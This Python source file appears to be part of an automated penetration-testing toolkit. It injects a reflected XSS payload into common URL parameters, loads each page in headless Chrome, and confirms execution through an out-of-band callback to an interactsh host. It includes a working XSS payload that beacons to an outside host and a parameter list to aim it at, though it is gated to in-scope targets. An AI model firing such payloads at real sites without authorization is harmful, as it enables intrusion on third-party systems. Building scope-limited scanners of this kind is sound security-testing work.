#!/usr/bin/env python3
"""xss_probe.py - reflected/DOM XSS detector with HEADLESS-EXECUTION validation.

XBOW doctrine: a finding is real only when a deterministic validator proves it. Reflection alone
is NOT proof - lots of reflections never execute. So we load the injected page in a real hardened
headless Chrome; the payload fires an OOB callback when it EXECUTES. OOB interaction = the browser
actually ran our JS = exploitable XSS, proven. (console marker is kept as corroboration.)

Payload is mixed-content-safe (HTTPS OOB callback) so it works on HTTPS targets. The DNS lookup of
the unique marker subdomain is itself an interaction, so a finding registers even if the HTTP leg
is filtered.

Safety: scope-gated (refuses before any navigation); browser is hardened/ephemeral/in-Mullvad
(browser.py); stops at PROOF-of-execution, does not weaponize or exfiltrate.
"""
from __future__ import annotations
import sys, json, argparse, pathlib, urllib.parse, uuid
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from runner import Scope
from authz_probe import in_scope
from oob import InteractshOOB
from browser import hardened_context
from playwright.sync_api import sync_playwright

XSS_PARAMS = ["q", "s", "search", "query", "keyword", "term", "name", "message", "comment",
              "text", "title", "redirect", "url", "return", "next", "lang", "page", "id",
              "ref", "callback", "input", "data", "value", "email"]


def _marker() -> str:
    return "x" + uuid.uuid4().hex[:10]


def _payload(marker: str, domain: str) -> str:
    cb = f"https://{marker}.{domain}/{marker}"            # HTTPS => no mixed-content block
    js = f"new Image().src='{cb}';console.log('{marker}')"
    return f'"><img src=x onerror="{js}">'                # breaks out of attr/element, onerror runs


def probe(target: str, provider: InteractshOOB, assets, params) -> list:
    host = urllib.parse.urlparse(target).hostname
    if host and not in_scope(assets, host):
        print(f"REFUSED: {host} not in scope")
        return []

    injected = {}                                          # marker -> (param, url)
    console_hits = set()
    with sync_playwright() as pw:
        with hardened_context(pw) as ctx:
            page = ctx.new_page()
            page.on("console", lambda m: [console_hits.add(mk) for mk in list(injected) if mk in m.text])
            page.on("dialog", lambda d: d.dismiss())        # don't let an alert() hang the page
            for p in params:
                marker = _marker()
                u = target + ("&" if "?" in target else "?") + urllib.parse.urlencode({p: _payload(marker, provider.domain)})
                injected[marker] = (p, u)
                try:
                    page.goto(u, wait_until="networkidle", timeout=9000)
                except Exception:
                    pass
                page.wait_for_timeout(500)                  # let onerror fire the callback

    provider.wait()                                         # interactsh poll cycle
    seen = provider.seen_markers()

    findings = []
    for marker, (p, u) in injected.items():
        if marker not in seen:
            continue
        findings.append({
            "class": "xss", "subtype": "reflected", "severity": "high", "endpoint": target, "param": p,
            "proof_request": f"GET {u}",
            "validated_by": "headless Chrome executed the injected JS -> out-of-band callback fired",
            "oob_provider": provider.__class__.__name__,
            "proof_interactions": provider.interactions_for(marker),
            "corroboration": {"console_marker_logged": marker in console_hits},
            "confirmed": True,
            "note": "PROOF of execution in a standard Chrome. Impact/stored-propagation is human-gated.",
        })
        print(f"[xss] CONFIRMED param={p} (marker {marker} executed -> OOB)")
    return findings


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--scope", default="benchmark/scope_bench.json")
    ap.add_argument("--out", default="xss_findings.json")
    ap.add_argument("--itsh-client", default=r"C:\Users\Laith\nabulus-tools\bin\interactsh-client.exe")
    ap.add_argument("--itsh-server", default=None)
    ap.add_argument("--workdir", default=str(pathlib.Path(__file__).resolve().parent))
    ap.add_argument("--poll-wait", type=float, default=11.0)
    ap.add_argument("--params", default=None, help="comma-separated override of candidate params")
    a = ap.parse_args()

    scope = Scope(json.loads(pathlib.Path(a.scope).read_text()))
    params = a.params.split(",") if a.params else XSS_PARAMS
    provider = InteractshOOB(a.itsh_client, a.workdir, server=a.itsh_server, poll_wait=a.poll_wait)
    provider.start()
    try:
        f = probe(a.target, provider, scope.assets, params)
    finally:
        provider.stop()
    pathlib.Path(a.out).write_text(json.dumps(f, indent=2))
    print(f"[xss] {len(f)} confirmed XSS finding(s) -> {a.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
